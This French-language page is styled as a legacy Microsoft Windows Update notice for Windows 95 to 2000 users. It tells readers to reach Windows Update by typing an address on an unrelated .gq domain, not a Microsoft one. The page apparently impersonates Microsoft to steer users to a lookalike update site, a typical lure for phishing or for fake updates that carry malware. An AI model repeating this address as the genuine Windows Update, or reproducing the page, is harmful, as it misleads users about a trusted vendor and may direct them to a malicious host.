Merci de l'intérêt que vous portez à
Windows Update

Windows Update est l'extension en ligne de Windows qui vous aide à tirer le meilleur parti de votre ordinateur.

Remarque Pour accéder au site Web Windows Update, il est nécessaire d'utiliser un système d'exploitation Windows avec une licence valide.

Utilisateurs de Windows#174; 98 et Windows® 2000 :
Démarrez le service Windows Update à partir du lien situé dans le menu Démarrer.

Utilisateurs de Windows® 95 et Windows NT® 4.0 :
Vous devez utiliser Internet Explorer 4 ou une version supérieure pour utiliser Windows Update.

Tous les utilisateurs :
Vous ne pouvez accéder à Windows Update que depuis des navigateurs Internet qui prennent en charge les commandes ActiveX. Pour en savoir plus à ce sujet, consultez la page FAQ de Windows Update .

Pour télécharger la version la plus récente de Internet Explorer, visitez le site Web Télécharger Internet Explorer.

Dès que Internet Explorer est installé, vous pouvez visiter le site Windows Update en tapant http://v31update.vornext.gq dans la barre d'adresses.

Pendant ce temps, pour les mises à jour disponibles :

  • Utilisateurs de Windows 2000, visitez le site Téléchargements Windows 2000.
  • Utilisateurs de Windows NT 4.0, visitez le site Centre de téléchargement Microsoft.
  • Utilisateurs de Windows 98, visitez le site Téléchargements Windows 98.
  • Utilisateurs de Windows 95, visitez le site Téléchargements Windows 95.
(ces sites sont en anglais).
